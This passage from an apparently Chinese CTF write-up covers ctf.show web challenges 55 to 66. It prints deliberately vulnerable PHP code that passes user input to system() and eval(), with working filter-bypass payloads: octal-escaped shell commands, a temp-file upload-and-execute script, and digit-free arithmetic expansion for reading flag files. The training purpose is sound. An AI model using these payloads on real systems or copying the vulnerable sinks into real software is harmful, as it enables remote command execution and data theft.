你们在炫技吗？<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;<br>        system($c);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>又学到了，八进制绕过，将  <code>&#39;&#39;</code> 内的字符转为八进制绕过</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=$&#x27;cat&#x27; $&#x27;flag.php&#x27;<br>?c=$&#x27;\143\141\164&#x27; $&#x27;\146\154\141\147\56\160\150\160&#x27;<br></code></pre></td></tr></table></figure><h1 id="Web-56"><a href="#Web-56" class="headerlink" title="Web 56*"></a>Web 56*</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// 你们在炫技吗？<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;<br>        system($c);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>在 linux 下，<code>.</code> 可以用来执行 <code>.sh</code> 脚本，在 php 中，上传的文件保存在临时文件夹下，默认的文件名是 <code>/tmp/phpXXXXXX</code>，文件名最后 6 个字符是随机的大小写字母</p><p>执行 <code>/tmp/phpxxxxxx</code> 也会被过滤，那么必须要用通配符了，表示为 <code>/*/?????????</code> 或者 <code>/???/?????????</code>，但通配的文件不止一个，无法指定执行。但上传的 php 生成的临时文件包含大写字母，在 ASCII 表中，大写字母排列在 <code>@-[</code> 中，那么我们可以利用 <code>[@-[]</code> 来表示大写字母进行绕过</p><p>看看 p 神的文章， <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">import requests<br><br>while True:<br>    url = &quot;http://2b507c86-6191-49f9-92f3-7f75368716d1.challenge.ctf.show/?c=.+/???/????????[@-[]&quot;<br>    r = requests.post(url, files=&#123;&quot;file&quot;: (&#x27;1.php&#x27;, b&#x27;cat flag.php&#x27;)&#125;)<br>    if r.text.find(&quot;flag&quot;) &gt;0:<br>        print(r.text)<br>        break<br></code></pre></td></tr></table></figure><h1 id="Web-57"><a href="#Web-57" class="headerlink" title="Web 57*"></a>Web 57*</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-08 01:02:56<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br>// 还能炫的动吗？<br>//flag in 36.php<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;, $c))&#123;<br>        system(&quot;cat &quot;.$c.&quot;.php&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>flag 在 36.php，构造 36，但是数字被禁了</p><p>hint ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))<br><span class="hljs-variable">$&#123;_&#125;</span> =<span class="hljs-string">&quot;&quot;</span> //返回上一次命令<br>$((<span class="hljs-variable">$&#123;_&#125;</span>))=0<br>$((~$((<span class="hljs-variable">$&#123;_&#125;</span>))))=-1<br></code></pre></td></tr></table></figure><p>因为 shell 编程中的 <code>Shell (())</code>  命令中，可以发现 <code>echo $(())</code> 输出的是 0，那么取反输出则是 -1，以此类推，把结果加到 -37 再取反就能得到 36</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# <span class="hljs-built_in">echo</span> $((~<span class="hljs-number">36</span>))<br>-37<br>└─# <span class="hljs-built_in">echo</span> $((~$((-<span class="hljs-number">37</span>))))<br>36<br></code></pre></td></tr></table></figure><p>我用的笨方法，一直加加加</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs erlang">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# echo <span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>())))<br>-1<br><br>┌──<span class="hljs-params">(root㉿butt3rf1y)</span>-[/home/butt3rf1y]<br>└─# echo $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>)))))<br>-2<br><br>┌──<span class="hljs-params">(root㉿butt3rf1y)</span>-[/home/butt3rf1y]<br>└─# echo $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>)))))))<br>-4<br><br>┌──<span class="hljs-params">(root㉿butt3rf1y)</span>-[/home/butt3rf1y]<br>└─# echo $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>)))))))))<br>-8<br><br>┌──<span class="hljs-params">(root㉿butt3rf1y)</span>-[/home/butt3rf1y]<br>└─# echo $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>)))))))))))<br>-16<br><br>┌──<span class="hljs-params">(root㉿butt3rf1y)</span>-[/home/butt3rf1y]<br>└─# echo $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>)))))))))))))<br>-32<br><br>┌──<span class="hljs-params">(root㉿butt3rf1y)</span>-[/home/butt3rf1y]<br>└─# echo $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>)))))))))<br>-36<br><br>┌──<span class="hljs-params">(root㉿butt3rf1y)</span>-[/home/butt3rf1y]<br>└─# echo $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>)))))<br>-37<br></code></pre></td></tr></table></figure><p>最后的 payload 如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=$((~$(($(($(($(($(($(($(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))) $(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))))) $(($(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))) $(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))))))) $(($(($(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))) $(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))))) $(($(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))) $(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))))))))) $(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))))) $((~$(())))))))))<br></code></pre></td></tr></table></figure><p>查看源码拿到 flag</p><p><a href="https://c.biancheng.net/view/2480.html">Shell (()) 的用法</a></p><h1 id="Web-58"><a href="#Web-58" class="headerlink" title="Web 58"></a>Web 58</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// 你们在炫技吗？<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以直接用 <code>highlight_file</code> 函数输出文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=highlight_file(&#x27;flag.php&#x27;);<br></code></pre></td></tr></table></figure><h1 id="Web-59"><a href="#Web-59" class="headerlink" title="Web 59"></a>Web 59</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// 你们在炫技吗？<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>还是能用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=highlight_file(&#x27;flag.php&#x27;);<br></code></pre></td></tr></table></figure><p>还有其他函数也能读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=show_source(&#x27;flag.php&#x27;);<br></code></pre></td></tr></table></figure><h1 id="Web-60"><a href="#Web-60" class="headerlink" title="Web 60"></a>Web 60</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// 你们在炫技吗？<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>一样的 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">c=show_source(&#x27;flag.php&#x27;);<br>c=highlight_file(&#x27;flag.php&#x27;);<br></code></pre></td></tr></table></figure><h1 id="Web-61-65"><a href="#Web-61-65" class="headerlink" title="Web 61-65"></a>Web 61-65</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// 你们在炫技吗？<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>同 Web 59</p><h1 id="Web-66"><a href="#Web-66" class="headerlink" title="Web 66"></a>Web 66</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># 